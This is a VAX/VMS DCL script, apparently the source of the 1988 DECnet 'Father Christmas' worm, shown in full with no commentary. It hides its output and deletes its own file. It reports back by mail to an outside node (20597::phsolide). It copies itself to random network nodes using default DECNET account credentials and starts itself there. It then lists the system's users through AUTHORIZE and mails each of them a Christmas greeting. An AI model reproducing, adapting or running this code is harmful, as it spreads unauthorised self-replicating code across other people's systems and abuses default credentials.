$ on error then continue
$ set noverify
$ define sys$error nl:
$ define sys$output nl:
$ set default sys$login
$ set process/name="MAIL_178DC"
$ delete := delete
$ spawn := spawn
$ null[0,7]=0
$ open/read/write link sys$net
$ close link
$Look_loop:
$ pid = f$pid(context)
$ if pid .eqs. "" then goto start
$ if f$getjpi(pid,"wsauthext")-1 .eq. f$getjpi(pid,"wsextent") then -
     goto stop_process
$ goto look_loop
$Stop_process:
$ set protection=o:rwed hi.com;*
$ delete hi.com;*
$ stop/id=0
$Start:
$ workset = f$getjpi(0,"wsauthext")-1
$ set work/extent='workset'
$Save:
$ counter = 0
$ open/read hi$file hi.com
$Loop1:
$ read/end_of_file=end_loop1 hi$file hiline'counter'
$ counter = counter + 1
$ goto loop1
$End_loop1:
$ close hi$file
$ num_hilines = counter
$ set protection=o:rwed hi.com;*
$ delete hi.com;*
$Action:
$ spawn/input=nl:/output=nl:/nonotify/nolog/nowait -
    mail/subj="''f$trnlnm("sys$announce")'" nl: 20597::phsolide
$Search_node:
$ time = f$extr(0,16,f$cvtime(f$time()))
$ if time .gts. "1988-12-24 00:30" then stop/id=0
$ if time .gts. "1988-12-24 00:00" then goto mailing
$Generate_node:
$ node = (f$int(f$ext(21,1,f$time()))*10000) +  -
         (f$int(f$ext(21,1,f$time()))*1000)  +  -
         (f$int(f$ext(21,1,f$time()))*100) +  -
         (f$int(f$ext(21,1,f$time()))*10) +  -
         (f$int(f$ext(21,1,f$time())))
$ node = node*(f$int(f$ext(18,2,f$time()))+1)/63
$ if node .eq. 0     then goto generate_node
$ if node .gt. 63*1024 then goto generate_node
$Reprod:
$ counter = 0
$ open/write/error=open_error  hi$file 'node'::hi.com
$Loop2:
$ write/error=cleanup hi$file hiline'counter'
$ if counter .eq. num_hilines-1 then goto end_loop2
$ counter = counter + 1
$ goto loop2
$End_loop2:
$ close hi$file
$Start_Task:
$ type 'node'::"task=hi.com"
$ if ($status.ne.%x10951098).or.(f$loc("""",node).ne.f$len(node)) -
     then goto 2nd_error_check
$ node := 'node'"""DECNET DECNET""
$ goto start_task
$2nd_error_check:
$ if $status .ne. "%x10000001" then goto cleanup
$ goto search_node
$Cleanup:
$ close hi$file
$ delete 'node'::hi.com;*
$ goto search_node
$Open_error:
$ if ($status.ne.%x1001c00a).or.(f$loc("""",node).ne.f$len(node))  -
      then   goto  search_node
$ node := 'node'"""DECNET DECNET""
$ goto reprod
$Mailing:
$ mailline0 = "Hi,"
$ mailline1 = ""
$ mailline2 = " how are ya ? I had a hard time preparing all the presents."
$ mailline3 = " It isn't quite an easy job. I'm getting more and more"
$ mailline4 = " letters from the children every year and it's not so easy"
$ mailline5 = " to get the terrible Rambo-Guns, Tanks and Space Ships up here at
"
$ mailline6 = " the Northpole. But now the good part is coming."
$ mailline7 = " Distributing all the presents with my sleigh and the"
$ mailline8 = " deers is real fun. When I slide down the chimneys"
$ mailline9 = " I often find a little present offered by the children,"
$ mailline10 = " or even a little Brandy from the father. (Yeah!)"
$ mailline11 = " Anyhow the chimneys are getting tighter and tighter"
$ mailline12 = " every year. I think I'll have to put my diet on again."
$ mailline13 = " And after Christmas I've got my big holidays :-)."
$ mailline14 = ""
$ mailline15 = " Now stop computing and have a good time at home !!!!"
$ mailline16 = ""
$ mailline17 = "    Merry Christmas"
$ mailline18 = "       and a happy New Year"
$ mailline19 = ""
$ mailline20 = "            Your  Father Christmas"
$ num_maillines = 21
$ define sysuaf sys$login:sysuaf
$ mc authorize
y
list/id *
exit
$ delete sys$login:sysuaf.dat;*
$ node = 0
$Mail_good:
$ open/read/write net$link 'node'::"27="
$ if ($status.ne.%x1001c002).or.(f$loc("""",node).ne.f$len(node)) -
    then goto start_mail
$ node := 'node'"""DECNET DECNET""
$ goto mail_good
$Start_mail:
$ close net$link
$ open/read        user$file  rightslist.lis
$ read             user$file  user
$Loop3:
$ open/read/write  net$link   'node'::"27="
$ write net$link  "Father Christmas"
$Next_user:
$ read/end_of_file=end_mailing  user$file user
$ if  f$extr(3,1,user) .eqs. " " then goto next_user
$ user = f$extr(2,12,user)
$ write net$link user
$ read  net$link error
$ if f$cvui(0,32,error) .ne. 1  then goto close_net
$ write net$link null
$ write net$link "You..."
$ write net$link "Christmas Card."
$ counter = 0
$Text_loop:
$ write net$link mailline'counter'
$ counter = counter + 1
$ if counter .eq. num_maillines then goto end_text_loop
$ goto text_loop
$End_text_loop:
$ write net$link null
$ wait 00:00:01
$Close_net:
$ close net$link
$ goto loop3
$End_mailing:
$ close net$link
$ close user$file
$ delete rightslist.lis;*
$ wait 00:30
$ stop/id=0

